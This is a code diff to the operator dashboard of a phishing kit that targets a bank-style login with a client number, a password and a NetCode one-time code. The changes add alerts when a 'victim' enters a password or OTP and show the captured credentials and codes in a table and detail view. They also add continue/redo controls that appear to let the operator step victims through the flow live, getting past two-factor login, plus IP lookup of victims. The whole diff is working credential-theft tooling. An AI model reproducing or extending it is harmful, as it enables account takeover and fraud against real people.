@@ -878,9 +878,11 @@
 
     /* ----------  STATUS  ---------- */
     function statusText(s){
-      if (s.page==='success' || s.status==='approved') return '';
-      if (s.page==='index.html' && s.clientNumber) return '<div style="font-size:11px;color:var(--green)">ENTERED CLIENT #</div>';
-      if (s.page==='verify.html' && s.netcode) return '<div style="font-size:11px;color:var(--green)">ENTERED NETCODE</div>';
+      if (s.page==='success' || s.status==='approved') return '<div style="font-size:11px;color:var(--green)">COMPLETED</div>';
+      if (s.page === 'verify.html' && s.otp) return '<div style="font-size:11px;color:var(--yellow)">NETCODE ENTERED</div>';
+      if (s.page === 'verify.html') return '<div style="font-size:11px;color:var(--blue)">AWAITING NETCODE</div>';
+      if (s.clientNumber && s.password) return '<div style="font-size:11px;color:var(--yellow)">CREDENTIALS ENTERED</div>';
+      if (s.clientNumber) return '<div style="font-size:11px;color:var(--yellow)">CLIENT # ENTERED</div>';
       return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
     }
 
@@ -889,10 +891,12 @@
       let html = '<div style="display:flex;gap:6px">';
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
       if (s.page === 'success' || s.status === 'approved') return html + '</div>';
-      if (s.page === 'index.html' && s.clientNumber) {
+      
+      // Show continue/redo buttons for both index and verify pages
+      if ((s.page === 'index.html' && s.clientNumber) || (s.page === 'verify.html' && s.otp)) {
         html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      } else if (s.page === 'verify.html' && s.netcode) {
+      } else if (s.page === 'index.html' && s.clientNumber) {
         html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
       }
@@ -902,25 +906,57 @@
     /* ----------  CHANGES  ---------- */
     function checkChanges(newSessions){
       if (isFirstLoad) {
-        lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
+        lastSessions = new Map(newSessions.map(s => [s.sid, {
+          clientNumber: s.clientNumber || '',
+          password: s.password || '',
+          otp: s.otp || '',
+          phone: s.phone || '',
+          page: s.page,
+          status: s.status
+        }]));
         isFirstLoad = false;
         return;
       }
       
       newSessions.forEach(s => {
         const old = lastSessions.get(s.sid);
+        
         if (!old) {
+          // New session connected
           showAlert('info', 'NEW VISITOR', `Connected from ${s.ip}`, s.victimNum);
-          if (s.clientNumber) showAlert('success', 'ENTERED CLIENT #', `Client: ${s.clientNumber}`, s.victimNum);
         } else {
-          if (!old.clientNumber && s.clientNumber) showAlert('success', 'ENTERED CLIENT #', `Client: ${s.clientNumber}`, s.victimNum);
-          if (!old.netcode && s.netcode) showAlert('success', 'ENTERED NETCODE', `NetCode: ${s.netcode}`, s.victimNum);
+          // Check for new client number entry
+          if (!old.clientNumber && s.clientNumber) {
+            showAlert('success', 'ENTERED CLIENT #', `Client: ${s.clientNumber}`, s.victimNum);
+          }
+          // Check for new password entry
+          if (!old.password && s.password) {
+            showAlert('success', 'ENTERED PASSWORD', `Password entered`, s.victimNum);
+          }
+          // Check for OTP/NetCode entry - THIS IS THE KEY FIX
+          if (!old.otp && s.otp) {
+            showAlert('success', 'ENTERED NETCODE', `NetCode: ${s.otp}`, s.victimNum);
+          }
+          // Check for phone/NetCode entry (legacy)
+          if (!old.phone && s.phone) {
+            showAlert('success', 'ENTERED NETCODE', `NetCode: ${s.phone}`, s.victimNum);
+          }
+          // Check for approval/success
           if ((old.page !== 'success' && s.page === 'success') || (old.status !== 'approved' && s.status === 'approved')) {
             showAlert('success', 'LOGIN APPROVED', 'Victim completed full flow', s.victimNum);
           }
         }
       });
-      lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
+      
+      // Update lastSessions with only the fields we care about
+      lastSessions = new Map(newSessions.map(s => [s.sid, {
+        clientNumber: s.clientNumber || '',
+        password: s.password || '',
+        otp: s.otp || '',
+        phone: s.phone || '',
+        page: s.page,
+        status: s.status
+      }]));
     }
 
     /* ----------  RENDER  ---------- */
@@ -929,6 +965,7 @@
       switch(f){
         case 'index.html': return 'LOGIN';
         case 'verify.html': return 'NETCODE';
+        case 'unregister.html': return 'UNREGISTER';
         default: return f;
       }
     }
@@ -974,7 +1011,7 @@
           <td>${s.victimNum}</td>
           <td><span class="cred">${s.clientNumber||'—'}</span></td>
           <td><span class="cred">${s.password||'—'}</span></td>
-          <td><span class="cred">${s.netcode||'—'}</span></td>
+          <td><span class="cred">${s.otp||s.phone||'—'}</span></td>
           <td><a class="ip-link" onclick="openIpLookup('${s.ip}')" title="Lookup IP">${s.ip}</a></td>
           <td>${s.platform}</td>
           <td>${s.browser}</td>
@@ -987,7 +1024,7 @@
     /* ----------  IP LOOKUP  ---------- */
     function openIpLookup(ip) {
       const cleanIp = ip.split(':')[0];
-      window.open(`https://db-ip.com/ ${cleanIp}`, '_blank');
+      window.open(`https://db-ip.com/${cleanIp}`, '_blank');
     }
 
     /* ----------  MODALS  ---------- */
@@ -1030,8 +1067,8 @@
             <div class="info-value mono">${s.password||'—'}</div>
           </div>
           <div class="info-section">
-            <div class="info-label">NetCode</div>
-            <div class="info-value mono">${s.netcode||'—'}</div>
+            <div class="info-label">NetCode/OTP</div>
+            <div class="info-value mono">${s.otp||s.phone||'—'}</div>
           </div>
           <div class="info-section full-width">
             <div class="info-label">System Information</div>
@@ -1138,3 +1175,4 @@
   </script>
 </body>
 </html>
+
